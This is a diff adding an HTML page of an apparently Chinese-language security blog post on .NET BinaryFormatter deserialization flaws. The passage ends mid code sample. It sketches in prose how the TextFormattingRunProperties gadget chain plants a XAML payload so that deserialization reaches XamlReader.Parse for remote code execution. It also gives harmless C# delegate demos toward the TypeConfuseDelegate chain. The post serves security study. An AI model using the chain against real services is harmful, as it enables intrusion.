@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Dot NET-BinaryFormatter反序列化漏洞 - N1Rvana&#39;s Blog</title><meta name="author" content="N1Rvana">
+<meta name="description" content="Web Security"><meta name="keywords" content='BinaryFormatter'>
+  <meta itemprop="name" content="Dot NET-BinaryFormatter反序列化漏洞">
+  <meta itemprop="description" content="Web Security">
+  <meta itemprop="datePublished" content="2025-06-09T15:41:08+08:00">
+  <meta itemprop="dateModified" content="2025-06-09T15:41:08+08:00">
+  <meta itemprop="wordCount" content="2067">
+  <meta itemprop="image" content="http://localhost:1313/avatar.png">
+  <meta itemprop="keywords" content="BinaryFormatter"><meta property="og:url" content="http://localhost:1313/dot-net-binaryformatter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+  <meta property="og:site_name" content="N1Rvana&#39;s Blog">
+  <meta property="og:title" content="Dot NET-BinaryFormatter反序列化漏洞">
+  <meta property="og:description" content="Web Security">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-06-09T15:41:08+08:00">
+    <meta property="article:modified_time" content="2025-06-09T15:41:08+08:00">
+    <meta property="article:tag" content="BinaryFormatter">
+    <meta property="og:image" content="http://localhost:1313/avatar.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/avatar.png">
+  <meta name="twitter:title" content="Dot NET-BinaryFormatter反序列化漏洞">
+  <meta name="twitter:description" content="Web Security">
+      <meta name="twitter:site" content="@huahua39079406">
+<meta name="twitter:creator" content="@huahua39079406" /><meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/dot-net-binaryformatter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Dot NET-BinaryFormatter反序列化漏洞 - N1Rvana&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/dot-net-.net-remoting%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Dot NET-.NET Remoting反序列化漏洞" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/dot-net-binaryformatter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.md" title="Dot NET-BinaryFormatter反序列化漏洞 - N1Rvana's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Dot NET-BinaryFormatter反序列化漏洞",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/dot-net-binaryformatter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\/"
+    },"genre": "posts","keywords": "BinaryFormatter","wordcount":  2067 ,
+    "url": "http:\/\/localhost:1313\/dot-net-binaryformatter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\/","datePublished": "2025-06-09T15:41:08+08:00","dateModified": "2025-06-09T15:41:08+08:00","license": "Web Security","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><span class="nested-item">
+                  <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item" data-separator="/"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item" data-separator="/"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" data-separator="/" aria-current="page">Dot NET-BinaryFormatter反序列化漏洞</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>Dot NET-BinaryFormatter反序列化漏洞</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/avatar.png" alt="N1Rvana" data-title="N1Rvana" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/.net/" class="post-category" title="Category - .NET"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> .NET</a></span></div><div class="post-meta-line"><span title="published on 2025-06-09 15:41:08"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-06-09">2025-06-09</time></span>&nbsp;<span title="2067 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2100 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#binaryformatter">BinaryFormatter</a>
+      <ul>
+        <li><a href="#命名空间接口">命名空间接口</a></li>
+      </ul>
+    </li>
+    <li><a href="#攻击链">攻击链</a>
+      <ul>
+        <li><a href="#textformattingrunproperties">TextFormattingRunProperties</a></li>
+        <li><a href="#typeconfusedelegate">TypeConfuseDelegate</a>
+          <ul>
+            <li><a href="#委托和多播委托">委托和多播委托</a></li>
+            <li><a href="#sortedset-and-comparer">SortedSet and Comparer</a></li>
+            <li><a href="#ysoserialnet-gadget">Ysoserial.net Gadget</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="binaryformatter" class="heading-element"><span>BinaryFormatter</span>
+  <a href="#binaryformatter" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>BinaryFormatter</code>将对象序列化为二进制流，命名空间位于<code>System.Runtime.Serialization.Formatters.Binary</code>。</p>
+<h3 id="命名空间接口" class="heading-element"><span>命名空间接口</span>
+  <a href="#%e5%91%bd%e5%90%8d%e7%a9%ba%e9%97%b4%e6%8e%a5%e5%8f%a3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>存在多个序列化和反序列化方法，并且实现了<code>IRemotingFormatter</code>, <code>IFormatter</code>两个接口。<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091249767.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091249767.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091249767.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091249767.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091249767.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091249767.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="攻击链" class="heading-element"><span>攻击链</span>
+  <a href="#%e6%94%bb%e5%87%bb%e9%93%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>yso.net</code>中所有的<code>gadget</code>都支持<code>BinaryFormatter</code>，其原因是<code>TextFormattingRunProperties</code>链。</p>
+<h3 id="textformattingrunproperties" class="heading-element"><span>TextFormattingRunProperties</span>
+  <a href="#textformattingrunproperties" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>其产生漏洞的主要原因就是<code>Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties</code>的序列化构造函数中，存在<code>this.GetObjectFromSerializationInfo(&quot;ForegroundBrush&quot;, info)</code>方法。<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091310491.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091310491.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091310491.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091310491.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091310491.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091310491.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+很明显这里<code>XmlReader.Parse(string)</code>是存在漏洞的。<br>
+整个链的流程就是</p>
+<ul>
+<li>自写一个TextFormattingRunPropertiesMarshal类实现ISerializable接口</li>
+<li>在GetObjectData序列化时给ForegroundBrush字段赋值为xaml的payload，并且将对象类型赋值为TextFormattingRunProperties类。</li>
+<li>在反序列化时触发反序列化构造函数</li>
+<li>反序列化构造函数触发<code>XamlReader.Parse(string)</code>来RCE。</li>
+</ul>
+<p>此链子限制<code>Microsoft.PowerShell.Editor.dll</code>。</p>
+<h3 id="typeconfusedelegate" class="heading-element"><span>TypeConfuseDelegate</span>
+  <a href="#typeconfusedelegate" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><code>TypeConfuseDelegate</code>类型混淆委托。</p>
+<h4 id="委托和多播委托" class="heading-element"><span>委托和多播委托</span>
+  <a href="#%e5%a7%94%e6%89%98%e5%92%8c%e5%a4%9a%e6%92%ad%e5%a7%94%e6%89%98" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>委托本质上是一个存有方法引用的变量，来创建一个委托</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Program</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>  
+</span></span><span class="line"><span class="cl">	<span class="kd">public</span> <span class="k">delegate</span> <span class="k">void</span> <span class="n">MyDelegate</span><span class="p">(</span><span class="kt">string</span> <span class="n">s</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">	<span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">PrintString</span><span class="p">(</span><span class="kt">string</span> <span class="n">s</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>  
+</span></span><span class="line"><span class="cl">		<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>  
+</span></span><span class="line"><span class="cl">	<span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>  
+</span></span><span class="line"><span class="cl">		<span class="n">MyDelegate</span> <span class="n">myDelegate</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MyDelegate</span><span class="p">(</span><span class="n">PrintString</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">		<span class="n">myDelegate</span><span class="p">(</span><span class="s">&#34;Delegate&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>传递给委托的方法签名必须和定义的委托签名一致，就是返回值、参数一致。<br>
+多播委托就是持有对委托列表的引用，把多播委托想象成一个列表，将委托的方法加入列表中，多播委托会按顺序依次调用每个委托。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Program</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="k">delegate</span> <span class="k">void</span> <span class="n">MyDelegate</span><span class="p">(</span><span class="kt">string</span> <span class="n">s</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">PrintString</span><span class="p">(</span><span class="kt">string</span> <span class="n">s</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">$&#34;print {s} to screen.&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">WriteToFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">s</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">$&#34;write {s} to file.&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">MyDelegate</span> <span class="n">myDelegate</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MyDelegate</span><span class="p">(</span><span class="n">PrintString</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">MyDelegate</span> <span class="n">myDelegate1</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MyDelegate</span><span class="p">(</span><span class="n">WriteToFile</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">myDelegate</span> <span class="p">+=</span> <span class="n">myDelegate1</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">myDelegate</span><span class="p">(</span><span class="s">&#34;hello&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="c1">// Output  </span>
+</span></span><span class="line"><span class="cl"><span class="n">print</span> <span class="n">hello</span> <span class="n">to</span> <span class="n">screen</span><span class="p">.</span>  
+</span></span><span class="line"><span class="cl"><span class="n">write</span> <span class="n">hello</span> <span class="n">to</span> <span class="n">file</span><span class="p">.</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过+=的形式添加多个委托，还可以使用<code>MulticastDelegate.Combine(printString, writeFile)</code>的形式。</p>
+<h4 id="sortedset-and-comparer" class="heading-element"><span>SortedSet and Comparer</span>
+  <a href="#sortedset-and-comparer" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>Demo</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
